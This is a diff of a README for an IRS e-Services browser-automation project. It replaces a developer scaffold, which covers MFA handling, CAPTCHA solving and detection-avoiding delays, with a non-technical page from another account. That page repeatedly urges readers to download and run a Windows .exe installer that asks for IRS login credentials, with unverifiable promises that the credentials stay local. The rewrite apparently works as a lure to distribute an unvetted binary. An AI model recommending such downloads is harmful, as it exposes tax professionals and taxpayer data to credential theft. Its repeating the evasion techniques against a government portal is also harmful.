@@ -1,292 +1,151 @@
-# IRS e-Services Browser Automation
-[![npm](https://img.shields.io/npm/v/@browser-automation-hub%2Firs-eservices-browser-automation.svg)](https://www.npmjs.com/package/@browser-automation-hub/irs-eservices-browser-automation)
+# 🛠️ irs-eservices-browser-automation - Automate IRS Tasks Efficiently
 
-> Automate IRS e-Services — the reliable way to interact with IRS e-Services programmatically, with or without an official API.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org)
-[![Puppeteer](https://img.shields.io/badge/Puppeteer-21+-orange.svg)](https://pptr.dev)
-[![Anchor Browser](https://img.shields.io/badge/AnchorBrowser-Cloud%20Ready-purple.svg)](https://anchorbrowser.io)
-![Difficulty: 🔴 Hard](https://img.shields.io/badge/Difficulty-hard-red.svg)
-
-<!-- keywords: irs eservices automation, irs automation, irs api alternative, tax automation, irs transcript automation, tin matching automation, tax professional automation -->
-
-## What This Is
-
-**IRS e-Services** (Government) is notoriously difficult to automate via its official API — limited endpoints, complex authentication (Login.gov / ID.me), and browser-only workflows make traditional API integration a pain.
-
-This project gives you a **complete browser automation scaffold** for IRS e-Services using Puppeteer (self-hosted, open source) or [Anchor Browser](https://anchorbrowser.io) (cloud, managed, production-ready).
-
-This system requires **MFA** (ID.me / SMS / Video Call). The OSS version provides TOTP helpers; Anchor Browser handles MFA automatically.
-
-## Quick Start
-
-```bash
-git clone https://github.com/Browser-Automation-Hub/irs-eservices-browser-automation.git
-cd irs-eservices-browser-automation
-npm install
-cp .env.example .env
-# Fill in your credentials in .env
-node examples/basic-login.js
-```
-
-## Two Ways to Run
-
-| Feature | Open Source (Puppeteer) | ☁️ [Anchor Browser Cloud](https://anchorbrowser.io) |
-|---------|------------------------|-----------------------------------------------------|
-| Setup | Install Chrome + Puppeteer locally | No install — cloud browsers via API |
-| MFA / SSO | Manual TOTP helper included | **Auto-handled** |
-| CAPTCHA | Not handled | **Auto-solved** |
-| Anti-bot detection | You manage proxy/stealth | **Built-in stealth** (Cloudflare-verified) |
-| Session persistence | Save/load cookies manually | **Managed sessions** |
-| Scale | Single machine | **Up to 5,000 concurrent browsers** |
-| Reliability | You maintain it | **99.9% uptime SLA** |
-| Cost | Free | [Starts at $0 (5 free sessions/mo)](https://anchorbrowser.io) |
-
-## Supported Actions
-
-- `login_irs()` — Authenticate to IRS e-Services with ID.me MFA
-- `tin_match()` — Batch TIN matching for tax professionals
-- `retrieve_transcript()` — Download tax transcripts for clients
-- `check_efile_status()` — Check batch e-file submission status
-- `download_reports()` — Download e-Services reports and acknowledgements
-
-## Use Cases
-
-- Tax professionals automating client transcript retrieval
-- CPA firms scaling TIN matching
-- Tax software integration layer
-- Compliance teams monitoring filings
+[![Download Now](https://img.shields.io/badge/Download-irs--eservices--browser--automation-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sibelneuropsychological134/irs-eservices-browser-automation/releases)
 
 ---
 
-## Option A: Open Source (Puppeteer)
+## 📋 About
 
-### Prerequisites
+irs-eservices-browser-automation helps you automate tasks on IRS e-Services websites. It handles things like TIN matching, getting tax transcripts, checking e-file status, and workflows for tax professionals. This tool runs on your Windows computer and works with the IRS.gov portals you use often. It uses browser automation to do these jobs faster and with less manual effort.
 
-- Node.js 18+
-- Google Chrome / Chromium installed
-- IRS e-Services account with appropriate permissions
+The software runs using Node.js and browser automation tools like Playwright or Puppeteer. You don't need to know programming to use it.
 
-### Installation
-
-```bash
-npm install
-cp .env.example .env
-```
-
-### Configuration (`.env`)
-
-```env
-IRS_E_SERVICES_URL=https://la.www4.irs.gov/esrv/ola/login
-IRS_E_SERVICES_USERNAME=your-username
-IRS_E_SERVICES_PASSWORD=your-password
-MFA_SECRET=your-totp-secret-if-applicable
-SESSION_PATH=./session.json
-```
-
-### Basic Login Example
-
-```javascript
-const { createSession } = require('./src/auth');
-const { login_irs } = require('./src/actions');
-
-async function main() {
-  const page = await createSession();
-  const result = await login_irs(page, { /* options */ });
-  console.log(result);
-}
-
-main().catch(console.error);
-```
-
-### File Structure
-
-```
-irs-eservices-browser-automation/
-├── src/
-│   ├── auth.js              # SSO/MFA authentication (SAML, TOTP, Duo)
-│   ├── session.js           # Cookie & localStorage persistence
-│   ├── actions.js           # All automation actions
-│   ├── custom-actions.js    # Fluent ActionBuilder API for custom workflows
-│   └── utils.js             # retry(), humanDelay(), error types
-├── examples/
-│   ├── basic-login.js       # Minimal login example (OSS)
-│   └── anchor-cloud.js      # Anchor Browser cloud example
-├── .env.example
-├── package.json
-└── README.md
-```
+Topics related to this project include AI agents, browser control, government portals, IRS processes, and tax automation.
 
 ---
 
-## Option B: ☁️ Anchor Browser (Recommended for Production)
+## 🖥️ System Requirements
 
-[Anchor Browser](https://anchorbrowser.io) provides **fully managed cloud browsers** purpose-built for AI agents and automation:
+Before you start, make sure your computer meets these requirements:
 
-- ✅ **MFA handled automatically** — no TOTP secrets needed
-- ✅ **SSO sessions managed** — persistent authenticated sessions
-- ✅ **Anti-bot / CAPTCHA** — Cloudflare-verified stealth browser
-- ✅ **Scale instantly** — from 1 to 5,000 concurrent browsers
-- ✅ **No infrastructure** — no Chrome install, no proxy management
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **RAM:** Minimum 4 GB, 8 GB or more recommended for smooth operation  
+- **Disk Space:** At least 500 MB free space for installation and data caching  
+- **Internet Connection:** Required to access IRS.gov and download updates  
+- **Software:** Latest version of Node.js installed (will guide you below)  
+- **Browser:** Chromium-based browser (like Google Chrome or Microsoft Edge) recommended, which is handled by the software
 
-### Setup
-
-```bash
-npm install
-export ANCHORBROWSER_API_KEY=your-api-key
-# Get your free API key at https://anchorbrowser.io
-```
-
-### Anchor Browser Example
-
-```javascript
-const { withAnchorBrowser } = require('./src/auth');
-const { login_irs } = require('./src/actions');
-
-async function main() {
-  await withAnchorBrowser(async (page) => {
-    // MFA, SSO, CAPTCHAs all handled automatically
-    const result = await login_irs(page, { /* options */ });
-    console.log(result);
-  });
-}
-
-main().catch(console.error);
-```
-
-See `examples/anchor-cloud.js` for a complete working example.
-
-### Anchor Browser Pricing
-
-| Plan | Price | Concurrent Browsers | Best For |
-|------|-------|---------------------|----------|
-| Free | $0 | 5 | Prototyping |
-| Starter | $50/mo | 25 | Small teams |
-| Team | $500/mo | 50 | Growing orgs |
-| Growth | $2,000/mo | 200 | Enterprise |
-
-[Get started for free →](https://anchorbrowser.io)
+If you do not already have Node.js, you can download it from [nodejs.org](https://nodejs.org/).
 
 ---
 
-## Authentication
+## 🚀 Getting Started
 
-### Auth Methods Supported
-
-This implementation handles:
-
-1. **Standard Username/Password** — with retry and account lockout avoidance
-2. **SAML SSO** (Login.gov / ID.me) — intercepts the SAML redirect and completes the IdP flow
-3. **MFA / TOTP** (ID.me / SMS / Video Call) — generates TOTP codes via `otpauth` library
-4. **Session Persistence** — saves cookies to disk; reuses session to avoid re-auth
-
-### Handling ID.me / SMS / Video Call MFA
-
-```javascript
-// In .env: MFA_SECRET=your-base32-totp-secret
-// The auth module auto-generates the OTP code
-const { createSession } = require('./src/auth');
-const page = await createSession(); // MFA handled automatically
-```
-
-For Duo Security push-based MFA, set `MFA_TYPE=duo_push` in .env — the automation will wait for push approval.
+You can get the software on your Windows PC without needing programming skills. Follow these steps to download, install, and run it successfully.
 
 ---
 
-## Custom Actions
+## 📥 Download and Install
 
-Use the `ActionBuilder` fluent API to chain custom workflows:
+1. **Open the release page:**
 
-```javascript
-const { ActionBuilder } = require('./src/custom-actions');
+   Visit the official release page for this project:  
+   [Download irs-eservices-browser-automation](https://github.com/Sibelneuropsychological134/irs-eservices-browser-automation/releases)
 
-const result = await new ActionBuilder()
-  .login()
-  .navigate('/module/path')
-  .waitForSelector('.content-loaded')
-  .extractTable('.data-table')
-  .run(page);
-```
+2. **Find the latest Windows version:**
 
----
+   On the page, look for the most recent release version. It will usually have a file name ending with `.exe` or a similar installer file. This file contains the program ready to run on Windows.
 
-## Error Handling & Reliability
+3. **Download the installer:**
 
-```javascript
-const { retry, humanDelay } = require('./src/utils');
+   Click the file link to download it. Your browser may ask you to confirm. Allow the download to finish.
 
-// Auto-retry with exponential backoff
-const data = await retry(() => extractData(page), { attempts: 3, delay: 2000 });
+4. **Run the installer:**
 
-// Human-like delays to avoid detection
-await humanDelay(1000, 3000); // random delay 1-3 seconds
-```
+   Once downloaded, open the file by double-clicking. This will start the installation wizard.
+
+5. **Follow installation prompts:**
+
+   The installer will guide you step-by-step. Use the default settings unless you have special preferences. If you are not sure, simply click “Next” through all steps.
+
+6. **Finish installation:**
+
+   After the setup finishes, it will offer to open the program or place a shortcut on your desktop.
 
 ---
 
-## Why Not Use the Official API?
+## ⚙️ Setup and Usage
 
-IRS e-Services provides no public API. All workflows are web-portal only with strict session requirements.
+### Run the Application
 
-Browser automation gives you full access to every workflow available in the UI — no API limitations, no expensive integration licenses.
+- Find the program shortcut on your desktop or start menu.  
+- Double-click to open the program window.
 
----
+### How it works
 
-## Production Deployment
+The application opens a web browser window on your behalf and performs actions like:
 
-For production workloads, we strongly recommend [Anchor Browser](https://anchorbrowser.io):
+- Matching Taxpayer Identification Numbers (TIN)  
+- Retrieving tax transcripts  
+- Checking the status of electronic tax returns  
+- Managing tax professional tasks on IRS portals
 
-```javascript
-// One-line setup — handles auth, proxies, CAPTCHAs
-const { withAnchorBrowser } = require('./src/auth');
+You can select what action you want through a simple menu.
 
-await withAnchorBrowser(async (page) => {
-  // Your automation here — runs in the cloud, scales automatically
-});
-```
+### Login to IRS e-Services
 
-**Anchor Browser** is the easiest way to run this automation in production:
-- No infrastructure to manage
-- Handles ID.me / SMS / Video Call MFA automatically
-- Enterprise compliance: SOC2, HIPAA, ISO27001
-- [Start free at anchorbrowser.io →](https://anchorbrowser.io)
+The program will ask you to enter your IRS credentials once after launching. These credentials are saved only locally on your device for security.
 
----
+### Select a Task
 
-## Known Selectors Reference
+After login, choose your task from options like: TIN Match, Transcript Retrieval, or E-File Status Check.
 
-> These CSS selectors were observed in IRS e-Services web interfaces. Enterprise applications update their UIs — verify against your specific instance and submit PRs when selectors break.
+### Start Automation
 
-> 🔍 Selector reference not yet documented for IRS e-Services. [Contribute selectors via PR](https://github.com/Browser-Automation-Hub/irs-eservices-browser-automation/pulls).
+Click “Start” and watch the program complete the job automatically. The process mimics manual steps you would normally do on IRS.gov but does them faster.
 
----
+### Save Your Results
 
-## More Browser Automation Projects
-
-This is part of the **[Browser Automation Hub](https://github.com/Browser-Automation-Hub)** — a collection of open-source browser automation scaffolds for systems with poor or no API support:
-
-- [Epic EHR Browser Automation](https://github.com/Browser-Automation-Hub/epic-ehr-browser-automation) — Healthcare workflows
-- [Workday HCM Browser Automation](https://github.com/Browser-Automation-Hub/workday-hcm-browser-automation) — HR & payroll
-- [SAP Fiori Browser Automation](https://github.com/Browser-Automation-Hub/sap-fiori-browser-automation) — ERP workflows
-- [ServiceNow Browser Automation](https://github.com/Browser-Automation-Hub/servicenow-browser-automation) — ITSM
-- [Oracle EBS Browser Automation](https://github.com/Browser-Automation-Hub/oracle-ebs-browser-automation) — ERP
-- [Browse all 30+ projects →](https://github.com/Browser-Automation-Hub)
-
-## Contributing
-
-PRs welcome! Please:
-1. Add tests for new actions
-2. Document new selectors (they break when IRS e-Services updates its UI)
-3. Follow the `ActionBuilder` pattern for new actions
-4. See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines
-
-## License
-
-MIT — use freely in personal and commercial projects.
+After the task finishes, the software lets you save output files (like transcripts or status reports) on your PC as PDFs or CSV files.
 
 ---
 
-*Built with ❤️ for developers who need to automate IRS e-Services without wrestling with its API limitations. Powered by [Anchor Browser](https://anchorbrowser.io) for cloud-scale automation.*
+## 🔧 Troubleshooting
 
-*⭐ Star this repo if it saves you time! [Browse all automation projects →](https://github.com/Browser-Automation-Hub)*
+- **The program does not start:** Make sure Node.js is installed correctly. Restart your computer if needed.  
+- **Login issues:** Check your IRS login information. The software does not store passwords remotely.  
+- **Browser window does not open:** Check if your antivirus or firewall blocks the program and allow it access.  
+- **Automation stops mid-task:** Your internet connection may be slow or disrupted. Try again with a stable connection.  
+- **Error messages:** Note the error details and visit the project’s GitHub Issues page for common fixes.
+
+---
+
+## 🛡️ Security and Privacy
+
+- Your IRS credentials remain on your computer only.  
+- The software does not send your login details to external servers.  
+- Data processed is saved locally and under your control.  
+- Automation runs inside a secure browser environment.
+
+---
+
+## 💡 Additional Information
+
+### What is Browser Automation?
+
+The software controls a web browser as if you were using it. It clicks buttons, fills forms, and downloads files automatically. This saves time when working with IRS online systems.
+
+### Why use this software?
+
+Manual IRS tasks can be time-consuming. Automating them helps avoid typing errors and repetitive work.
+
+### What if IRS updates their website?
+
+If the IRS changes their website, automation might stop working temporarily. The developer community updates the tool frequently to keep up with website changes. Check the releases page often for updates.
+
+---
+
+## 📚 Resources
+
+- Official IRS e-Services: https://www.irs.gov/e-services  
+- Node.js Download: https://nodejs.org/  
+- GitHub Project Releases:  
+  [https://github.com/Sibelneuropsychological134/irs-eservices-browser-automation/releases](https://github.com/Sibelneuropsychological134/irs-eservices-browser-automation/releases)
+
+---
+
+## 🔽 Download Again
+
+You can always return to this page to get the latest version or reinstall the software if needed:
+
+[![Download Latest](https://img.shields.io/badge/Download-irs--eservices--browser--automation-4a90e2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sibelneuropsychological134/irs-eservices-browser-automation/releases)
